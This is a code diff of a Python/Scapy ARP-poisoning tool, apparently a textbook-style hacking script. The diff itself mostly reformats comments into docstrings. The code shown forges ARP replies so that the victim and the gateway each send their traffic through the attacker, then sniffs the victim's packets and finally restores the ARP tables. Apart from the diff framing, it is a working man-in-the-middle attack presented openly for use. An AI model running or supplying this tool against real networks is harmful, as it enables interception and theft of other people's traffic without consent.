@@ -1,10 +1,5 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 '''
-ARP poisoning with Python and Scapy.
-
-ARP poisoning is one of the oldest yet most effective tricks in a hacker's toolkit. We convince a target machine that we have become it's gateway, and we will convince the gateway that in order to reach the target machine, all traffic has to go through us. 
+ARP poisoning.
 '''
 # Import needed packages
 from multiprocessing import Process
@@ -13,16 +8,22 @@ import os
 import sys
 import time
 
-# Get MAC address for any given machine
+
 def get_mac(targetip):
+    '''
+    Get MAC address for any given machine.
+    '''
     packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=targetip)
     resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
     for _, r in resp:
         return r[Ether].src
     return None
 
-# The Arper
+
 class Arper:
+    '''
+    The ARP class.
+    '''
     def __init__(self, victim, gateway, interface='eth0'):
         self.victim = victim
         self.victimmac = get_mac(victim)
@@ -37,16 +38,22 @@ class Arper:
         print(f'Victim ({victim}) is at {self.victimmac}')
         print('-'*30)
 
-    # The entry point for the attack
+
     def run(self):
+        '''
+        Entry point.
+        '''
         self.poison_thread = Process(target=self.poison)
         self.poison_thread.start()
 
         self.sniff_thread = Process(target=self.sniff)
         self.sniff_thread.start()
 
-    # Creates the poisoned packets and sends them to the victim and the gateway.
+
     def poison(self):
+        '''
+        Creates the poisoned packates and send them to the victim and the gateway.
+        '''
         poison_victim = ARP()
         poison_victim.op = 2
         poison_victim.psrc = self.gateway
@@ -83,8 +90,11 @@ class Arper:
             else:
                 time.sleep(2)
 
-    # Sniff the network
+
     def sniff(self, count=200):
+        '''
+        Sniff the network.
+        '''
         time.sleep(5)
         print(f'Sniffing {count} packets.')
         bpf_filter = 'ip host %s' % victim
@@ -95,11 +105,15 @@ class Arper:
         self.poison_thread.terminate()
         print('Finished.')
 
-    # Restore the ARP attack
+
     def restore(self):
+        '''
+        Restore ARP attack.
+        '''
         print('Restoring ARP tables...')
         send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
         send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
+
 
 if __name__ == '__main__':
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
